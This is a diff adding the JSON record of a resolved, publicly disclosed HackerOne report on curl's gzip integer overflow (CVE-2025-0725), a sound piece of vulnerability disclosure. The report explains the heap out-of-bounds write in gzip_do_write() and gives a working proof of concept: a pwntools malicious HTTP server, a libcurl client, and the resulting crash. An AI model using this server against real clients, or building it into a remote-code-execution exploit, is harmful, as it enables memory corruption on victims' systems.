@@ -1,0 +1,127 @@
+{
+  "id": 2956023,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTU2MDIz",
+  "url": "https://hackerone.com/reports/2956023",
+  "title": "CVE-2025-0725: gzip integer overflow",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-23T23:37:03.914Z",
+  "submitted_at": "2025-01-23T23:37:04.309Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "z2_",
+    "url": "/z2_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/5eld4c9eg34za1r92ipvd757pa9d/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-0725"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-05T13:11:34.355Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-02-05T13:11:34.187Z",
+  "team_member_agreed_on_going_public_at": "2025-02-05T13:08:42.295Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, no AI slop this time. I promise!\n\nThe current master branch of [libcurl](https://github.com/curl/curl/tree/7e814c8717939393d4436d75f5f0c3ffa98c8c53) contains a vulnerability in [lib/content_encoding.c](https://github.com/curl/curl/blob/7e814c8717939393d4436d75f5f0c3ffa98c8c53/lib/content_encoding.c#L539) that allows a malicious HTTP-server to craft an arbitrary heap chunk in the memory of the victim and issue a `free()` of that forged chunk, when `Content-Encoding: gzip` is in use.\n\nThe vulnerability is in function `gzip_do_write()` in lines 533 - 544:\n```c\n    z->avail_in += (uInt) nbytes;\n    z->next_in = Curl_saferealloc(z->next_in, z->avail_in);\n    if(!z->next_in) {\n      return exit_zlib(data, z, &zp->zlib_init, CURLE_OUT_OF_MEMORY);\n    }\n    /* Append the new block of data to the previous one */\n    memcpy(z->next_in + z->avail_in - nbytes, buf, nbytes);\n\n    switch(check_gzip_header(z->next_in, (ssize_t)z->avail_in, &hlen)) {\n    case GZIP_OK:\n      /* This is the zlib stream data */\n      free(z->next_in);\n```\n\nOn systems with a zlib version < `1.2.0.4`, libcurl offers to manually parse gzip headers and trailers  instead of passing everything to zlib as is. Unfortunately, when parsing the headers the remote server can trigger an integer overflow of `z->avail_in` in line 533, which leads the following `Curl_saferealloc()` call to shrink the chunk `z->next_in`. The following `memcpy()` can then write out-of-bounds before `z->next_in`, overwriting chunk metadata of the allocator. And right after the oob-write was triggered, the call to `free(z->next_in)` puts the forged chunk into the freelist of the allocator. `z->avail_in` can be overflowed because libcurl supports endlessly large gzip headers that can lead to repeated calls of `gzip_do_write()` with `zp->zlib_init == ZLIB_GZIP_HEADER` that keep incrementing `z->avail_in` with the amount of received data `nbytes`.\n\n# PoC\nConsider the following malicious HTTP-server:\n```py\n#!/usr/bin/env python3\n\nfrom pwn import *\n\ngzip_header = bytes([\n    0x1f, 0x8b, # magic values\n    8, # method\n    8, # flags\n    0, 0, 0, 0, 0, 0, # random bullshit go\n])\n\nwith listen(1234) as conn:\n    conn.wait_for_connection()\n    \n    # Discard HTTP request\n    while True:\n        line = conn.recvline()\n        \n        if line == b\"\\r\\n\":\n            break\n    \n    # Fill up buffer\n    conn.sendline(b\"HTTP/1.1 200 OK\\r\")\n    conn.sendline(b\"Content-Encoding: gzip\\r\")\n    conn.sendline(b\"\\r\")\n    conn.send(gzip_header)\n    \n    todo = 0xFFFFFFFF - 15 - len(gzip_header)\n    amnt = 6000000\n    \n    while todo > amnt:\n        conn.send(bytes([1]) * amnt)\n        todo -= amnt\n        \n    conn.send(bytes([1]) * todo)\n    \n    # Trigger integer overflow\n    time.sleep(5)\n    conn.send(bytes(32)) # forged chunk\n```\n\nAnd consider the following libcurl client:\n```c\n#include <curl/curl.h>\n\nint main (void) {\n    CURL *curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"http://127.0.0.1:1234/\");\n    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, \"gzip\");\n    curl_easy_setopt(curl, CURLOPT_BUFFERSIZE, 10485760); // to speed up the PoC\n    curl_easy_perform(curl);\n}\n```\n\nWhen launching\n```\npython3 ./server.py\n```\nin one terminal and \n```\n./client\n```\nin another terminal, we can observe that after \\~10min. we get the following message:\n```\nfree(): invalid pointer\n[1]    233088 IOT instruction (core dumped)  ./client\n```\nMeaning that we were successfully able to overwrite chunk metadata.\n\n## Impact\n\nThe vulnerability\n- exists both in the library and the tool in every installation\n- is easy to trigger, a victim just has to be pointed to an evil URL\n- can lead to RCE when combined with information leaks that bypass ASLR\n  because it offers a controlled heap out-of-bounds write exploitation primitive\n\nThus I suggest severity \"High\"",
+  "weakness": {
+    "id": 860,
+    "name": "Integer Overflow to Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2025-03-07T13:08:42.599Z",
+  "allow_singular_disclosure_after": -36387003.63279815,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "aboalezz",
+    "z2_",
+    "zy9ard3",
+    "starlox",
+    "mohaned0101",
+    "thalaivar304",
+    "2026",
+    "mr-alienx-kurd",
+    "labupump",
+    "ashiquethaha",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
